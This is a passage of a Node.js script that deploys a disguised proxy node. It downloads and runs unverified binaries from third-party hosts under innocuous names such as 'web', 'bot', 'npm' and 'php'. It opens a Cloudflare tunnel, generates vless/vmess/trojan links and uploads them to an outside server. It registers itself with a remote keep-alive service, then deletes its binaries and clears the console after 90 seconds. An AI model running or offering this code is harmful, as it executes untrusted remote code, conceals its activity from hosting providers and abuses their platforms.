    console.error(`web running error: ${error}`);
  }

  // 运行cloud-fared
  if (fs.existsSync(botPath)) {
    let args;

    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
    } else if (ARGO_AUTH.match(/TunnelSecret/)) {
      args = `tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;
    } else {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
    }

    try {
      await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);
      console.log(`${botName} is running`);
      await new Promise((resolve) => setTimeout(resolve, 2000));
    } catch (error) {
      console.error(`Error executing command: ${error}`);
    }
  }
  await new Promise((resolve) => setTimeout(resolve, 5000));

}

//根据系统架构返回对应的url
function getFilesForArchitecture(architecture) {
  let baseFiles;
  if (architecture === 'arm') {
    baseFiles = [
      { fileName: webPath, fileUrl: "https://arm64.ssss.nyc.mn/web" },
      { fileName: botPath, fileUrl: "https://arm64.ssss.nyc.mn/bot" }
    ];
  } else {
    baseFiles = [
      { fileName: webPath, fileUrl: "https://amd64.ssss.nyc.mn/web" },
      { fileName: botPath, fileUrl: "https://amd64.ssss.nyc.mn/bot" }
    ];
  }

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) {
      const npmUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/agent"
        : "https://amd64.ssss.nyc.mn/agent";
        baseFiles.unshift({ 
          fileName: npmPath, 
          fileUrl: npmUrl 
        });
    } else {
      const phpUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/v1" 
        : "https://amd64.ssss.nyc.mn/v1";
      baseFiles.unshift({ 
        fileName: phpPath, 
        fileUrl: phpUrl
      });
    }
  }

  return baseFiles;
}

// 获取固定隧道json
function argoType() {
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console.log("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels");
    return;
  }

  if (ARGO_AUTH.includes('TunnelSecret')) {
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), ARGO_AUTH);
    const tunnelYaml = `
  tunnel: ${ARGO_AUTH.split('"')[11]}
  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
  protocol: http2
  
  ingress:
    - hostname: ${ARGO_DOMAIN}
      service: http://localhost:${ARGO_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  `;
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
  } else {
    console.log("ARGO_AUTH mismatch TunnelSecret,use token connect to tunnel");
  }
}
argoType();

// 获取临时隧道domain
async function extractDomains() {
  let argoDomain;

  if (ARGO_AUTH && ARGO_DOMAIN) {
    argoDomain = ARGO_DOMAIN;
    console.log('ARGO_DOMAIN:', argoDomain);
    await generateLinks(argoDomain);
  } else {
    try {
      const fileContent = fs.readFileSync(path.join(FILE_PATH, 'boot.log'), 'utf-8');
      const lines = fileContent.split('\n');
      const argoDomains = [];
      lines.forEach((line) => {
        const domainMatch = line.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
        if (domainMatch) {
          const domain = domainMatch[1];
          argoDomains.push(domain);
        }
      });

      if (argoDomains.length > 0) {
        argoDomain = argoDomains[0];
        console.log('ArgoDomain:', argoDomain);
        await generateLinks(argoDomain);
      } else {
        console.log('ArgoDomain not found, re-running bot to obtain ArgoDomain');
        // 删除 boot.log 文件，等待 2s 重新运行 server 以获取 ArgoDomain
        fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
        async function killBotProcess() {
          try {
            // Windows系统使用taskkill命令
            if (process.platform === 'win32') {
              await exec(`taskkill /f /im ${botName}.exe > nul 2>&1`);
            } else {
              await exec(`pkill -f "[${botName.charAt(0)}]${botName.substring(1)}" > /dev/null 2>&1`);
            }
          } catch (error) {
            // 忽略输出
          }
        }
        killBotProcess();
        await new Promise((resolve) => setTimeout(resolve, 3000));
        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
        try {
          await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);
          console.log(`${botName} is running`);
          await new Promise((resolve) => setTimeout(resolve, 3000));
          await extractDomains(); // 重新提取域名
        } catch (error) {
          console.error(`Error executing command: ${error}`);
        }
      }
    } catch (error) {
      console.error('Error reading boot.log:', error);
    }
  }

  // 生成 list 和 sub 信息
  async function generateLinks(argoDomain) {
    const metaInfo = execSync(
      'curl -sm 5 https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
      { encoding: 'utf-8' }
    );
    const ISP = metaInfo.trim();
    // 如果 NAME 为空，则只使用 ISP 作为名称
    const nodeName = NAME ? `${NAME}-${ISP}` : ISP;

    return new Promise((resolve) => {
      setTimeout(() => {
        const VMESS = { v: '2', ps: `${nodeName}`, add: CFIP, port: CFPORT, id: UUID, aid: '0', scy: 'none', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '', fp: 'firefox'};
        const subTxt = `
vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}
  
vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}
  
trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}
    `;
        // 打印 sub.txt 内容到控制台
        console.log(Buffer.from(subTxt).toString('base64'));
        fs.writeFileSync(subPath, Buffer.from(subTxt).toString('base64'));
        console.log(`${FILE_PATH}/sub.txt saved successfully`);
        uploadNodes();
        // 将内容进行 base64 编码并写入 SUB_PATH 路由
        app.get(`/${SUB_PATH}`, (req, res) => {
          const encodedContent = Buffer.from(subTxt).toString('base64');
          res.set('Content-Type', 'text/plain; charset=utf-8');
          res.send(encodedContent);
        });
        resolve(subTxt);
      }, 2000);
    });
  }
}

// 自动上传节点或订阅
async function uploadNodes() {
  if (UPLOAD_URL && PROJECT_URL) {
    const subscriptionUrl = `${PROJECT_URL}/${SUB_PATH}`;
    const jsonData = {
      subscription: [subscriptionUrl]
    };
    try {
        const response = await axios.post(`${UPLOAD_URL}/api/add-subscriptions`, jsonData, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        if (response && response.status === 200) {
            console.log('Subscription uploaded successfully');
            return response;
        } else {
          return null;
          //  console.log('Unknown response status');
        }
    } catch (error) {
        if (error.response) {
            if (error.response.status === 400) {
              //  console.error('Subscription already exists');
            }
        }
    }
  } else if (UPLOAD_URL) {
      if (!fs.existsSync(listPath)) return;
      const content = fs.readFileSync(listPath, 'utf-8');
      const nodes = content.split('\n').filter(line => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line));

      if (nodes.length === 0) return;

      const jsonData = JSON.stringify({ nodes });

      try {
          const response = await axios.post(`${UPLOAD_URL}/api/add-nodes`, jsonData, {
              headers: { 'Content-Type': 'application/json' }
          });
          if (response && response.status === 200) {
            console.log('Nodes uploaded successfully');
            return response;
        } else {
            return null;
        }
      } catch (error) {
          return null;
      }
  } else {
      // console.log('Skipping upload nodes');
      return;
  }
}

// 90s后删除相关文件
function cleanFiles() {
  setTimeout(() => {
    const filesToDelete = [bootLogPath, configPath, webPath, botPath];  
    
    if (NEZHA_PORT) {
      filesToDelete.push(npmPath);
    } else if (NEZHA_SERVER && NEZHA_KEY) {
      filesToDelete.push(phpPath);
    }

    // Windows系统使用不同的删除命令
    if (process.platform === 'win32') {
      exec(`del /f /q ${filesToDelete.join(' ')} > nul 2>&1`, (error) => {
        console.clear();
        console.log('App is running');
        console.log('Thank you for using this script, enjoy!');
      });
    } else {
      exec(`rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`, (error) => {
        console.clear();
        console.log('App is running');
        console.log('Thank you for using this script, enjoy!');
      });
    }
  }, 90000); // 90s
}
cleanFiles();

// 自动访问项目URL
async function AddVisitTask() {
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console.log("Skipping adding automatic access task");
    return;
  }

  try {
    const response = await axios.post('https://oooo.serv00.net/add-url', {
      url: PROJECT_URL
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
    // console.log(`${JSON.stringify(response.data)}`);
    console.log(`automatic access task added successfully`);
    return response;
  } catch (error) {
    console.error(`Add automatic access task faild: ${error.message}`);
    return null;
  }
}

// 主运行逻辑
async function startserver() {
  try {
    deleteNodes();
    cleanupOldFiles();
    await generateConfig();
    await downloadFilesAndRun();
    await extractDomains();
    await AddVisitTask();
  } catch (error) {
    console.error('Error in startserver:', error);
  }
}
startserver().catch(error => {
  console.error('Unhandled error in startserver:', error);
});

app.listen(PORT, () => console.log(`http server is running on port:${PORT}!`));
